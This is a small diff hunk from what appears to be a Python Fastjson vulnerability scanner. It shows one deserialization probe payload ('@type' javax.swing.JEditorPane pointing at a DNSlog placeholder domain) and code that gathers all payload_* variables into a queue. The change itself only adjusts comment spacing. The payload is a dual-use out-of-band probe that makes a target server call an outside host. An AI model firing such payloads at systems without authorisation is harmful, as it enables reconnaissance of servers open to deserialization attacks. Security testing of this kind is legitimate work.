@@ -103,8 +103,8 @@ def get_dnsPayloadQueue(dnslog_domain):
     payload_31 = '{"@type":"javax.swing.JEditorPane","page": "http://dnslog_random_domain"}'
 
     payloads = []
-    Variable = inspect.currentframe().f_locals  # 获取所有变量
-    for _ in Variable.keys():                   # 遍历所有变量，获取payload的变量
+    Variable = inspect.currentframe().f_locals   # 获取所有变量
+    for _ in Variable.keys():                    # 遍历所有变量，获取payload的变量
         if 'payload_' in _:
             payloads.append(Variable[_])
 
